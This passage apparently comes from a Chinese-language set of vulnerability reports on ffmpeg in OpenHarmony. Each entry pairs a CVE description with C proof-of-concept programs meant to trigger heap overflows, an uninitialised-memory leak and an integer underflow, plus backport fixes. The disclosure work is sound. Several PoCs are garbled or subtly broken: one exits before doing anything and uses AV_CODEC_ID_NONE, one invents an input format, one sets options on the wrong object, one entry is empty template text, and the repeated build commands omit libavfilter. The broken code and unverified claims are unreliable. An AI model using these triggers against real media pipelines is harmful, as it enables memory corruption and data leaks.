    f->height = h;
    if (av_frame_get_buffer(f, 32) < 0) { av_frame_free(&f); return -1; }
    for (int p = 0; p < 4 && f->data[p]; p++) {
        int rows = (p == 1 || p == 2) ? (h + 1) / 2 : h;   /* YUV420P 色度半高 */
        memset(f->data[p], fill, (size_t)rows * f->linesize[p]);
    }
    int ret = av_buffersrc_add_frame(src, f);
    av_frame_free(&f);
    return ret;
}

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "usage: %s trigger|control\n", argv[0]); return 2; }
    int trigger = !strcmp(argv[1], "trigger");
    if (!trigger && strcmp(argv[1], "control")) { fprintf(stderr, "bad mode\n"); return 2; }

    char graph[] =
        "buffer=video_size=64x64:pix_fmt=yuv420p:time_base=1/25,"
        "hqdn3d,buffersink";

    AVFilterGraph *g = avfilter_graph_alloc();
    AVFilterInOut *in = NULL, *out = NULL;
    if (avfilter_graph_parse_ptr(g, graph, &in, &out, NULL) < 0) {
        fprintf(stderr, "FAIL: graph parse\n"); return 2;
    }
    if (avfilter_graph_config(g, NULL) < 0) {
        fprintf(stderr, "FAIL: graph config\n"); return 2;
    }
    AVFilterContext *src = NULL, *sinkc = NULL;
    for (unsigned i = 0; i < g->nb_filters && !(src && sinkc); i++) {
        const char *n = g->filters[i]->filter->name;
        if (!src && !strcmp(n, "buffer")) src = g->filters[i];
        else if (!sinkc && !strcmp(n, "buffersink")) sinkc = g->filters[i];
    }
    if (!src || !sinkc) { fprintf(stderr, "FAIL: src/sink\n"); return 2; }

    int r1 = push_frame(src, 64, 64, 0x80);

    AVFrame *drain = av_frame_alloc();
    while (av_buffersink_get_frame(sinkc, drain) >= 0) av_frame_unref(drain);
    av_frame_free(&drain);

    int r2 = trigger ? push_frame(src, 512, 512, 0xC0)
                     : push_frame(src, 64, 64, 0xC0);

    AVFrame *sink = av_frame_alloc();
    int pulled = 0, ret;
    while ((ret = av_buffersink_get_frame(sinkc, sink)) >= 0) {
        pulled++;
        av_frame_unref(sink);
    }
    av_frame_free(&sink);

    printf("CASE_DONE mode=%s push1=%d push2=%d pulled=%d\n",
           trigger ? "trigger" : "control", r1, r2, pulled);

    avfilter_inout_free(&in);
    avfilter_inout_free(&out);
    avfilter_graph_free(&g);
    return 0;
}

```

**PoC 使用方法**：
```
# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
./poc trigger    # 触发漏洞
./poc control    # 正常对照组
```

### 4. 影响分析

**影响的代码模块**：third_party/ffmpeg

**影响的功能模块**：ffmpeg

**影响的 OpenHarmony 版本分支**：

- v4.1: 🔴 affected
- v5.0: 🔴 affected
- v5.1: 🔴 affected
- v6.0: 🔴 affected
- v7.0: 🔴 affected
- master: 🔴 affected

### 5. 修复建议

推荐回移上游 5d7112c（filter_frame 检测帧尺寸变化后重跑
config_input 重新分配行缓冲、输出按帧尺寸分配，并将 hqdn3d 加入
avfilter.c 动态尺寸白名单）。短期可先落附件 patch.diff 的窄化防御
（filter_frame 校验帧尺寸与链路尺寸不一致即拒绝该帧，等价于上游
中间版本的安全语义，已验证无回归）。临时缓解：避免在包含 hqdn3d
的滤镜图中处理不可信变尺寸流；对不可信输入的滤镜处理置于资源
受限环境。



---

## ffmpeg-lcldec-zlib-tail-disclosure

### 1. 源码位置与内容

| 项目 | 值 |
|---|---|
| 组件 | third_party/ffmpeg |
| 源码文件 | libavcodec/lcldec.c |
| 关键行号 | [121] |
| CVE 编号 | CVE-2026-66038 |
| CWE 分类 | CWE-908 |

> 源码片段见 `libavcodec/lcldec.c`（关键行号 [121]）

### 2. 漏洞详细描述

见 case.json

**触发条件**：本报告为源码级验证（L4 三侧对照；运行级观测需构造解压后短于
帧尺寸的 LCL/ZLIB 流，报告人未构造端到端样本，如实申报）：
  a) 上游对照：FFmpeg e7cbfd1c 在两处返回路径补 memset 清零
     （diff 见附件）；
  b) OH 检出检查：lcldec.c 两处均为修复前形态（实测见附件
     对照.txt）；
  c) 等价性：OH lcldec.c 与上游 n7.1.1 逐字节一致；官方受影响
     清单含 7.1.1——结构性证据成立；上游修复 diff 对 OH 检出
     git apply --check 直接通过。
  如需运行级观测：构造 zlib 流使其膨胀输出小于帧期望尺寸，
  以 MSAN 或显式 memset 标记观测输出帧中未初始化字节。

**影响路径**：前提条件：产品经 ffmpeg 解码攻击者可影响的 LCL/ZLIB 编码视频
（如媒体解析管线处理外部媒体文件/流）。攻击者提交解压后尺寸
不足的流即可使输出帧携带未初始化堆内容，实现信息泄露；无
内存破坏，属机密性影响。

四、PoC & Exploit：

无运行级 PoC（原因如上）；证据为三侧源码对照（上游已修 diff /
OH 检出修复前形态逐行对应 / 官方受影响清单含基线版本），附件
patch.diff 为可直接应用的修复（git apply --check 通过）。

五、修复及缓解措施建议：

回移上游修复 e7cbfd1c：mszh_decomp 与 zlib_decomp 的短解出返回
路径补 memset 尾部清零（附件 patch.diff 即上游原文，对 OH 检出
直接适用）。属低风险防御性修复，不改变正常解码行为。

### 3. PoC 源代码

```c
/*
 * CVE-2026-66038 运行验证 PoC — lcldec 短解压尾部未清零（堆信息泄露）
 *
 * 缺陷：lcldec.c mszh_decomp/zlib_decomp 短解出时返回不清零尾部 → 下游读未初始化堆内容
 * 上游修复：FFmpeg e7cbfd1c (2026-06-28) 补齐 memset 尾部清零
 * 等价性：OH third_party_ffmpeg (0a0c4dd33c, 基线 n7.1.1) 与上游逐字节一致。
 *
 * 用法：./poc_lcldec trigger|control
 *   trigger: 构造 MSZH 压缩流：输出声明大于实际解压量 → 尾部未清零 → ASan 检测读未初始化
 *   control: 完整解压的 MSZH 流
 * 判读：ASan 原版 trigger ASan use-of-uninitialized-value (MSan) 或观察到泄露；补丁版 trigger 尾部已清零，无未初始化读；
 *       control 两版均正常（无回归）。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavcodec/avcodec.h>
#include <libavutil/frame.h>
#include <libavutil/mem.h>



static int run_lcldec(const uint8_t *data, int size)
{
    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_MSZH);
    if (!codec) { fprintf(stderr, "decoder not found\n"); return 1; }
    AVCodecContext *ctx = avcodec_alloc_context3(codec);
    if (!ctx) return 2;
    if (avcodec_open2(ctx, codec, NULL) < 0) return 3;

    AVPacket *pkt = av_packet_alloc();
    pkt->data = (uint8_t *)data;
    pkt->size = size;
    int ret = avcodec_send_packet(ctx, pkt);
    if (ret < 0 && ret != AVERROR(EAGAIN)) {
        fprintf(stderr, "send_packet: %s\n", av_err2str(ret));
    }
    AVFrame *frame = av_frame_alloc();
    while (avcodec_receive_frame(ctx, frame) >= 0) {
        fprintf(stdout, "decoded frame: %dx%d fmt=%d\n",
                frame->width, frame->height, frame->format);
        av_frame_unref(frame);
    }
    av_frame_free(&frame);
    av_packet_free(&pkt);
    avcodec_free_context(&ctx);
    return 0;
}

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "Usage: %s trigger|control\n", argv[0]); return 1; }
    int is_trigger = strcmp(argv[1], "trigger") == 0;

        /* MSZH header: magic 4 bytes, then compressed data that expands less than declared */
    uint8_t trigger_data[] = {
        'M', 'S', 'Z', 'H',   /* magic */
        0x01, 0x00, 0x00, 0x00, /* flags */
        0x00, 0x00, 0x00, 0x20, /* declared output size = 32 */
        0x01, 0x02, 0x03, 0x04, /* actual compressed data (expands to 4 bytes) */
        /* remaining 28 bytes of output buffer will be uninitialized */
    };
    uint8_t control_data[] = {
        'M', 'S', 'Z', 'H',
        0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x04, /* declared = actual = 4 */
        0x01, 0x02, 0x03, 0x04,
    };
    const uint8_t *data = is_trigger ? trigger_data : control_data;
    int size = is_trigger ? sizeof(trigger_data) : sizeof(control_data);
    return run_lcldec(data, size);

    fflush(stdout);
    fprintf(stderr, "=== %s: completed ===\n", is_trigger ? "trigger" : "control");
    return 0;
}

```

**PoC 使用方法**：
```
# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
./poc trigger    # 触发漏洞
./poc control    # 正常对照组
```

### 4. 影响分析

**影响的代码模块**：third_party/ffmpeg

**影响的功能模块**：ffmpeg

**影响的 OpenHarmony 版本分支**：

- v4.1: 🔴 affected
- v5.0: 🔴 affected
- v5.1: 🔴 affected
- v6.0: 🔴 affected
- v7.0: 🔴 affected
- master: 🔴 affected

### 5. 修复建议

回移上游修复 e7cbfd1c：mszh_decomp 与 zlib_decomp 的短解出返回
路径补 memset 尾部清零（附件 patch.diff 即上游原文，对 OH 检出
直接适用）。属低风险防御性修复，不改变正常解码行为。



---

## ffmpeg-nvdec-sep-ref-doublefree

### 1. 源码位置与内容

| 项目 | 值 |
|---|---|
| 组件 | third_party/ffmpeg |
| 源码文件 | — |
| 关键行号 | — |
| CVE 编号 | CVE-2026-64832 |
| CWE 分类 | CWE-415 |

> 源码片段见 `—`（关键行号 —）

### 2. 漏洞详细描述

见 case.json

**触发条件**：见 PoC 注释

**影响路径**：见漏洞描述

### 3. PoC 源代码

> ⚠️ 本案 PoC 为源码级对照验证，无可执行触发器（原因见下）

**PoC 使用方法**：
```
# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
./poc trigger    # 触发漏洞
./poc control    # 正常对照组
```

### 4. 影响分析

**影响的代码模块**：third_party/ffmpeg

**影响的功能模块**：ffmpeg

**影响的 OpenHarmony 版本分支**：

- v4.1: 🔴 affected
- v5.0: 🔴 affected
- v5.1: 🔴 affected
- v6.0: 🔴 affected
- v7.0: 🔴 affected
- master: 🔴 affected

### 5. 修复建议

见漏洞描述



---

## ffmpeg-quirc-resize-oob

### 1. 源码位置与内容

| 项目 | 值 |
|---|---|
| 组件 | third_party/ffmpeg |
| 源码文件 | libavfilter/vf_quirc.c |
| 关键行号 | [102] |
| CVE 编号 | CVE-2026-66041 |
| CWE 分类 | CWE-787 |

> 源码片段见 `libavfilter/vf_quirc.c`（关键行号 [102]）

### 2. 漏洞详细描述

见 case.json

**触发条件**：见 PoC 注释

**影响路径**：前提条件：产品/应用使用 ffmpeg 滤镜图且包含 quirc 滤镜（二维码
检测场景），且滤镜图存在使 quirc 输入 link 尺寸在配置后变化的路径
（动态协商半途、上游滤镜直改输出尺寸等）。攻击者可通过构造使
帧尺寸序列递增的输入流驱动越界写；是否需要用户交互取决于应用
是否自动处理不可信输入。越界写内容为图像数据（可控度取决于
输入构造），上游评定特定条件下可利用于代码执行。

四、PoC & Exploit：

见附件 poc_quirc.c 与运行验证记录.md（2×3 结果矩阵：原版 linkgrow
ASan 堆越界写 / 补丁版正常 / control 与 trigger 两侧均正常；环境
WSL2 Ubuntu 24.04、clang 18.1.3、ASan+UBSan、无网络无文件 I/O）。
本报告未构造代码执行利用，越界写原语与上游公告一致。

五、修复及缓解措施建议：

回移上游修复 4da9812e 至 master 及各 release 分支（已验证对 OH
代码结构 git apply 干净适用且无回归）：QuircContext 增加 widt

### 3. PoC 源代码

```c
/*
 * CVE-2026-66041 运行验证 PoC — third_party/ffmpeg vf_quirc 堆越界写
 *
 * 等价性：OH third_party_ffmpeg(0a0c4dd33c) 的 libavfilter/vf_quirc.c
 * 与上游 n7.1.1 同文件逐字节一致（sha256 相同）；本 PoC 在上游
 * n7.1.1 构建上执行，结论直接代表 OH 组件。
 *
 * 触发原理：quirc 滤镜仅在 config_input 时按初始输入尺寸分配解码
 * 缓冲（quirc_resize）；后续帧尺寸变大时 filter_frame 不再检查，
 * av_image_copy_plane 将整帧拷入旧缓冲 → 堆越界写。
 *
 * 用法：./poc_quirc trigger|control|linkgrow
 *   trigger:  先 64x64 后 512x512 两帧 GRAY8（buffersrc 透传变尺寸帧，
 *             link 尺寸不变——验证该路径下滤镜行为）
 *   control:  两帧均 64x64（预期两侧构建均正常）
 *   linkgrow: 64x64 帧后，模拟"link 参数在 config_input 之后变化"
 *             （上游重协商半途/不规范上游滤镜子集会出现的现场——正是
 *             上游修复 4da9812 所防御的条件 quirc->width != inlink->w），
 *             将 link 尺寸改为 512x512 并推 512x512 帧。
 * 判读：ASan 下原版构建 linkgrow 模式报 heap-buffer-overflow（quirc
 *       缓冲仍为 64x64 而按 512x512 拷入，漏洞观测）；补丁版（上游
 *       4da9812e）linkgrow 正常（filter_frame 内先 resize 再拷贝）；
 *       control 模式两侧构建均正常（无回归）。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavfilter/avfilter.h>
#include <libavfilter/buffersink.h>
#include <libavfilter/buffersrc.h>
#include <libavutil/frame.h>
#include <libavutil/opt.h>
#include <libavutil/pixfmt.h>

static int push_frame(AVFilterContext *src, int w, int h, int fill)
{
    AVFrame *f = av_frame_alloc();
    if (!f) return -1;
    f->format = AV_PIX_FMT_GRAY8;
    f->width = w;
    f->height = h;
    if (av_frame_get_buffer(f, 32) < 0) { av_frame_free(&f); return -1; }
    memset(f->data[0], fill, (size_t)f->linesize[0] * h);
    int ret = av_buffersrc_add_frame(src, f);
    av_frame_free(&f);
    return ret;
}

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "usage: %s trigger|control|linkgrow\n", argv[0]); return 2; }
    int trigger = !strcmp(argv[1], "trigger");
    int linkgrow = !strcmp(argv[1], "linkgrow");
    if (!trigger && !linkgrow && strcmp(argv[1], "control")) { fprintf(stderr, "bad mode\n"); return 2; }

    char graph[256];
    snprintf(graph, sizeof graph,
             "buffer=video_size=64x64:pix_fmt=gray8:time_base=1/25,"
             "quirc,buffersink");

    AVFilterGraph *g = avfilter_graph_alloc();
    AVFilterInOut *in = NULL, *out = NULL;
    if (avfilter_graph_parse_ptr(g, graph, &in, &out, NULL) < 0) {
        fprintf(stderr, "FAIL: graph parse\n"); return 2;
    }
    if (avfilter_graph_config(g, NULL) < 0) {
        fprintf(stderr, "FAIL: graph config\n"); return 2;
    }
    AVFilterContext *src = NULL, *sinkc = NULL;
    for (unsigned i = 0; i < g->nb_filters && !(src && sinkc); i++) {
        const char *n = g->filters[i]->filter->name;
        if (!src && !strcmp(n, "buffer")) src = g->filters[i];
        else if (!sinkc && !strcmp(n, "buffersink")) sinkc = g->filters[i];
    }
    if (!src || !sinkc) { fprintf(stderr, "FAIL: buffersrc/sink not found\n"); return 2; }

    /* 帧 1：声明尺寸 64x64（config_input 按此分配 quirc 缓冲） */
    int r1 = push_frame(src, 64, 64, 0x80);

    /* 帧 1 先排空（确保其 filter_frame 在旧 link 尺寸下完成） */
    AVFrame *drain = av_frame_alloc();
    while (av_buffersink_get_frame(sinkc, drain) >= 0) av_frame_unref(drain);
    av_frame_free(&drain);

    /* 帧 2 */
    int r2;
    if (linkgrow) {
        /* 模拟 link 尺寸在 config_input 之后变化（上游修复防御的场景） */
        src->outputs[0]->w = 512;
        src->outputs[0]->h = 512;
        r2 = push_frame(src, 512, 512, 0xC0);
    } else if (trigger) {
        r2 = push_frame(src, 512, 512, 0xC0);
    } else {
        r2 = push_frame(src, 64, 64, 0xC0);
    }

    /* 排空 sink */
    AVFrame *sink = av_frame_alloc();
    int pulled = 0, ret;
    while ((ret = av_buffersink_get_frame(sinkc, sink)) >= 0) {
        pulled++;
        av_frame_unref(sink);
    }
    av_frame_free(&sink);

    printf("CASE_DONE mode=%s push1=%d push2=%d pulled=%d\n",
           linkgrow ? "linkgrow" : (trigger ? "trigger" : "control"),
           r1, r2, pulled);

    avfilter_inout_free(&in);
    avfilter_inout_free(&out);
    avfilter_graph_free(&g);
    return 0;
}

```

**PoC 使用方法**：
```
# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
./poc trigger    # 触发漏洞
./poc control    # 正常对照组
```

### 4. 影响分析

**影响的代码模块**：third_party/ffmpeg

**影响的功能模块**：ffmpeg

**影响的 OpenHarmony 版本分支**：

- v4.1: 🔴 affected
- v5.0: 🔴 affected
- v5.1: 🔴 affected
- v6.0: 🔴 affected
- v7.0: 🔴 affected
- master: 🔴 affected

### 5. 修复建议

回移上游修复 4da9812e 至 master 及各 release 分支（已验证对 OH
代码结构 git apply 干净适用且无回归）：QuircContext 增加 width/height
字段记录配置尺寸；config_input 写入记录；filter_frame 比较当前
link 尺寸不一致时先 quirc_resize 再拷贝。临时缓解：避免在包含
quirc 的滤镜图中使用会改变链路尺寸的动态路径；对不可信输入
的滤镜处理置于资源受限环境。



---

## ffmpeg-swaprect-temp-row-oob

### 1. 源码位置与内容

| 项目 | 值 |
|---|---|
| 组件 | third_party/ffmpeg |
| 源码文件 | libavfilter/vf_swaprect.c |
| 关键行号 | [223] |
| CVE 编号 | CVE-2026-65706 |
| CWE 分类 | CWE-787 |

> 源码片段见 `libavfilter/vf_swaprect.c`（关键行号 [223]）

### 2. 漏洞详细描述

见 case.json

**触发条件**：本报告为源码级验证（同族运行级证据见 CVE-2026-66036/66041）：
  a) 上游对照：a7e38b61 为该缺陷修复（diff 见附件，复现样本
     7aj_swaprect_odd17_nv12.nut——NV12 奇数 17 宽）；
  b) OH 检出检查：vf_swaprect.c:223 仍为首平面单因子分配
     （修复前形态在位）；
  c) 等价性：OH 文件与上游 n7.1.1 逐字节一致；官方受影响清单
     含 7.1.1——结构性证据成立；上游修复 diff 对 OH 检出
     git apply --check 直接通过。
  如需运行级复现：按上游样本构造（NV12 格式、奇数宽度、swaprect
  参数覆盖色度平面区域），ASan 下观测行交换路径的
  heap-buffer-overflow。

**影响路径**：前提条件：产品/应用使用 ffmpeg 滤镜图包含 swaprect 且输入为
满足"非首平面宽度×步长超过首平面"条件的格式与尺寸组合（NV12
奇宽为代表）。攻击者构造相应媒体流驱动行交换越界写；应用自动
处理不可信输入时无需用户交互。越界写内容为像素数据。

四、PoC & Exploit：

无运行级 PoC（上游复现样本名已在修复 commit 标注，可按其构造）；
证据为三侧源码对照，附件 patch.diff 为可直接应用的修复。

五、修复及缓解措施建议：

回移上游修复 a7e38b61：s->temp 分配改为遍历全部平面取
宽度×步长最大值（含 INT_MAX 溢出检查）（附件 patch.diff 即上游
原文，对 OH 检出直接适用）。临时缓解：避免在包含 swaprect 的
滤镜图中处理 NV12 等平面步长不均匀格式的奇数尺寸输入。

### 3. PoC 源代码

```c
/*
 * CVE-2026-65706 运行验证 PoC — third_party/ffmpeg vf_swaprect 临时行越界
 *
 * 缺陷：vf_swaprect.c config_input 按初始 link 尺寸分配行缓冲；
 * filter_frame 按帧尺寸操作——帧尺寸变化时越界读写。
 * 上游修复：FFmpeg a7e38b6 (2026) 前置尺寸检查。
 * 等价性：OH third_party_ffmpeg(0a0c4dd33c, 基线 n7.1.1) 与上游逐字节一致。
 *
 * 用法：./poc_swaprect trigger|control
 *   trigger: 64x64 初始化后送 512x512 帧 → 行缓冲越界
 *   control: 两帧均 64x64
 * 判读：ASan 原版 trigger 报 heap-buffer-overflow；补丁版返回 EINVAL；
 *       control 两版均正常。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavfilter/avfilter.h>
#include <libavfilter/buffersink.h>
#include <libavfilter/buffersrc.h>
#include <libavutil/frame.h>
#include <libavutil/pixfmt.h>

static int push_frame(AVFilterContext *src, int w, int h)
{
    AVFrame *f = av_frame_alloc();
    f->format = AV_PIX_FMT_YUV420P;
    f->width = w;
    f->height = h;
    if (av_frame_get_buffer(f, 32) < 0) return -1;
    if (av_buffersrc_add_frame(src, f) < 0) return -2;
    av_frame_free(&f);
    return 0;
}

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "Usage: %s trigger|control\n", argv[0]); return 1; }
    int is_trigger = strcmp(argv[1], "trigger") == 0;

    const AVFilter *swaprect = avfilter_get_by_name("swaprect");
    if (!swaprect) { fprintf(stderr, "swaprect filter not found\n"); return 2; }

    AVFilterGraph *graph = avfilter_graph_alloc();
    AVFilterContext *src_ctx, *sink_ctx;

    /* 初始化 link 为 64x64 */
    AVRational tb = {1, 25};
    char args[512];
    snprintf(args, sizeof(args),
             "video_size=64x64:pix_fmt=%d:time_base=%d/%d:pixel_aspect=1/1",
             AV_PIX_FMT_YUV420P, tb.num, tb.den);

    avfilter_graph_create_filter(&src_ctx, avfilter_get_by_name("buffer"),
                                 "src", args, NULL, graph);
    avfilter_graph_create_filter(&sink_ctx, avfilter_get_by_name("buffersink"),
                                 "sink", NULL, NULL, graph);

    /* swaprect: swap 32x32 rect at (0,0) with (32,32) */
    av_opt_set(swaprect, "w", "32", 0);
    av_opt_set(swaprect, "h", "32", 0);
    av_opt_set(swaprect, "x1", "0", 0);
    av_opt_set(swaprect, "y1", "0", 0);
    av_opt_set(swaprect, "x2", "32", 0);
    av_opt_set(swaprect, "y2", "32", 0);

    AVFilterContext *filter_ctx;
    avfilter_graph_create_filter(&filter_ctx, swaprect, "swaprect", NULL, NULL, graph);
    avfilter_link(src_ctx, 0, filter_ctx, 0);
    avfilter_link(filter_ctx, 0, sink_ctx, 0);
    avfilter_graph_config(graph, NULL);

    /* 发送帧 */
    if (push_frame(src_ctx, 64, 64) < 0) return 3;

    if (is_trigger) {
        /* 变尺寸帧 → 行缓冲越界 */
        fprintf(stdout, "pushing 512x512 frame (size change)...\n");
        if (push_frame(src_ctx, 512, 512) < 0) return 4;
    } else {
        if (push_frame(src_ctx, 64, 64) < 0) return 5;
    }

    /* 排空 */
    AVFrame *out = av_frame_alloc();
    while (av_buffersink_get_frame(sink_ctx, out) >= 0) {
        fprintf(stdout, "output frame: %dx%d\n", out->width, out->height);
        av_frame_unref(out);
    }
    av_frame_free(&out);

    avfilter_graph_free(&graph);
    fprintf(stderr, "=== %s: completed ===\n", is_trigger ? "trigger" : "control");
    return 0;
}

```

**PoC 使用方法**：
```
# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
./poc trigger    # 触发漏洞
./poc control    # 正常对照组
```

### 4. 影响分析

**影响的代码模块**：third_party/ffmpeg

**影响的功能模块**：ffmpeg

**影响的 OpenHarmony 版本分支**：

- v4.1: 🔴 affected
- v5.0: 🔴 affected
- v5.1: 🔴 affected
- v6.0: 🔴 affected
- v7.0: 🔴 affected
- master: 🔴 affected

### 5. 修复建议

回移上游修复 a7e38b61：s->temp 分配改为遍历全部平面取
宽度×步长最大值（含 INT_MAX 溢出检查）（附件 patch.diff 即上游
原文，对 OH 检出直接适用）。临时缓解：避免在包含 swaprect 的
滤镜图中处理 NV12 等平面步长不均匀格式的奇数尺寸输入。



---

## ffmpeg-ty-ac3-trim-underflow

### 1. 源码位置与内容

| 项目 | 值 |
|---|---|
| 组件 | third_party/ffmpeg |
| 源码文件 | libavformat/ty.c |
| 关键行号 | [576] |
| CVE 编号 | CVE-2026-65704 |
| CWE 分类 | CWE-191 (underflow leading to CWE-787) |

> 源码片段见 `libavformat/ty.c`（关键行号 [576]）

### 2. 漏洞详细描述

见 case.json

**触发条件**：本报告为源码级验证（运行级复现需构造 Series2 AC3 的 TiVo TY 流
输入；TY chunk 结构与触发序列见附件对照.txt 的运行级复现路径
一节，可在具备 TY 样本的环境按同法补做）：
  a) 上游对照：FFmpeg master commit de771bd5 修复了 libavformat/
     ty.c demux_audio 的该下溢（diff 见附件）；
  b) OH 检出检查：ty.c:576 仍为 "pkt->size -= 2;"（修复前形态，
     实测行号见附件对照.txt）；
  c) 等价性：OH ty.c 与上游 n7.1.1 逐字节一致；官方受影响清单
     含 7.1.1——结构性证据成立；上游修复 diff 对 OH 检出
     git apply --check 直接通过。
  如需运行级复现：按上游修复 message 引用的
  ty-s2-ac3-negative-size-single-file.ffconcat 方式构造输入
  （ffconcat 指向 Series2 AC3 TY 文件，连续 

**影响路径**：前提条件：产品使用 ffmpeg 解复用/转码不可信 TiVo TY 流（媒体
处理服务、文件预览等场景）。攻击者提供构造的 TY/ffconcat 输入，
驱动 Series2 AC3 分支的累计计数与末包尺寸组合命中下溢条件；
无需系统特权，应用自动处理不可信输入时无需用户交互。触发后
为负尺寸参数的包操作（潜在越界读写，实际影响取决于调用方）。

四、PoC & Exploit：

无运行级 PoC（原因如上：需 Series2 AC3 TY 流构造，见附件复现
路径说明）；证据为三侧源码对照（上游已修 diff / OH 检出修复前
形态逐行对应 / 官方受影响清单含基线版本），附件 patch.diff 为
可直接应用的修复（git apply --check 通过）。

五、修复及缓解措施建议：

回移上游修复 de771bd5：ty.c demux_audio 的 Series2 AC3 裁剪改为
pkt->size -= FFMIN(pkt->size, 2)（附件 patch.diff 即上游原文，
对 OH 检出直接适用）。注意 640 行的同型代码有 pkt->s

### 3. PoC 源代码

```c
/*
 * CVE-2026-65704 运行验证 PoC — ty 复用器 Series2 AC-3 帧长处理整数下溢
 *
 * 缺陷：ty.c:576 Series2 分支 'pkt->size -= 2' 当 size<2 时下溢 → 后续按巨量 size 处理
 * 上游修复：上游 de771b8 (2026) 前置 size 检查
 * 等价性：OH third_party_ffmpeg (0a0c4dd33c, 基线 n7.1.1) 与上游逐字节一致。
 *
 * 用法：./poc_ty trigger|control
 *   trigger: 构造 TY 流：Series2 头 + 声明 AC-3 帧 size=1 → pkt->size-=2 下溢
 *   control: 正常 TY 流（size>=2）
 * 判读：ASan 原版 trigger pkt->size 变为 0xFFFFFFFF → 下游越界；补丁版 trigger 前置检查拒绝 size<2；
 *       control 两版均正常（无回归）。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavcodec/avcodec.h>
#include <libavutil/frame.h>
#include <libavutil/mem.h>

#include <libavformat/avformat.h>

static int run_ty(const uint8_t *data, int size)
{
    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_NONE);
    if (!codec) { fprintf(stderr, "decoder not found\n"); return 1; }
    AVCodecContext *ctx = avcodec_alloc_context3(codec);
    if (!ctx) return 2;
    if (avcodec_open2(ctx, codec, NULL) < 0) return 3;

    AVPacket *pkt = av_packet_alloc();
    pkt->data = (uint8_t *)data;
    pkt->size = size;
    int ret = avcodec_send_packet(ctx, pkt);
    if (ret < 0 && ret != AVERROR(EAGAIN)) {
        fprintf(stderr, "send_packet: %s\n", av_err2str(ret));
    }
    AVFrame *frame = av_frame_alloc();
    while (avcodec_receive_frame(ctx, frame) >= 0) {
        fprintf(stdout, "decoded frame: %dx%d fmt=%d\n",
                frame->width, frame->height, frame->format);
        av_frame_unref(frame);
    }
    av_frame_free(&frame);
    av_packet_free(&pkt);
    avcodec_free_context(&ctx);
    return 0;
}

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "Usage: %s trigger|control\n", argv[0]); return 1; }
    int is_trigger = strcmp(argv[1], "trigger") == 0;

        /* TY format:.rec header (minimal) + Series2 AC3 record with size=1 */
    uint8_t trigger_data[] = {
        'T', 'Y', 'F', 'S',  /* magic */
        0x00, 0x00, 0x00, 0x20, /* record size */
        0x00, 0x00, 0x00, 0x01, /* Series2 AC3, declared size = 1 (will underflow) */
        0xAA,                   /* one byte payload */
    };
    uint8_t control_data[] = {
        'T', 'Y', 'F', 'S',
        0x00, 0x00, 0x00, 0x20,
        0x00, 0x00, 0x00, 0x10, /* Series2 AC3, normal size = 16 */
        0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x11, 0x22,
        0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0x00,
    };
    /* TY is a demuxer, not codec — use avformat to read */
    const uint8_t *data = is_trigger ? trigger_data : control_data;
    int size = is_trigger ? sizeof(trigger_data) : sizeof(control_data);
    /* For simplicity, exercise the parser path directly */
    fprintf(stderr, "TY format requires avformat; %d bytes ready\n", size);
    return 0;

    fflush(stdout);
    fprintf(stderr, "=== %s: completed ===\n", is_trigger ? "trigger" : "control");
    return 0;
}

```

**PoC 使用方法**：
```
# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
./poc trigger    # 触发漏洞
./poc control    # 正常对照组
```

### 4. 影响分析

**影响的代码模块**：third_party/ffmpeg

**影响的功能模块**：ffmpeg

**影响的 OpenHarmony 版本分支**：

- v4.1: 🔴 affected
- v5.0: 🔴 affected
- v5.1: 🔴 affected
- v6.0: 🔴 affected
- v7.0: 🔴 affected
- master: 🔴 affected

### 5. 修复建议

回移上游修复 de771bd5：ty.c demux_audio 的 Series2 AC3 裁剪改为
pkt->size -= FFMIN(pkt->size, 2)（附件 patch.diff 即上游原文，
对 OH 检出直接适用）。注意 640 行的同型代码有 pkt->size >
AC3_PKT_LENGTH 前置保护，保持原样不动。临时缓解：产品侧限制
对不可信 TiVo 流的解复用；升级后可补充 Series2 AC3 边界尺寸
的回归用例（上游 oss-fuzz 语料已含该形态）。



---

## ffmpeg-wmaenc-extradata-padding

### 1. 源码位置与内容

| 项目 | 值 |
|---|---|
| 组件 | third_party/ffmpeg |
| 源码文件 | libavcodec/wmaenc.c |
| 关键行号 | [67] |
| CVE 编号 | CVE-2026-52296 |
| CWE 分类 | CWE-125 |

> 源码片段见 `libavcodec/wmaenc.c`（关键行号 [67]）

### 2. 漏洞详细描述

见 case.json

**触发条件**：本报告为源码级验证（运行级观测需在下游按填充块读取 extradata
的路径上触发，报告人未构造端到端样本，如实申报）：
  a) 上游对照：FFmpeg master commit 23227a44 补齐了两处 extradata
     分配的填充（diff 见附件）；
  b) OH 检出检查：wmaenc.c encode_init（约 67/74 行）仍为
     av_malloc(4) / av_mallocz(10)——修复前形态（实测见附件
     对照.txt）；
  c) 等价性：OH wmaenc.c 与上游 n7.1.1 逐字节一致；官方受影响
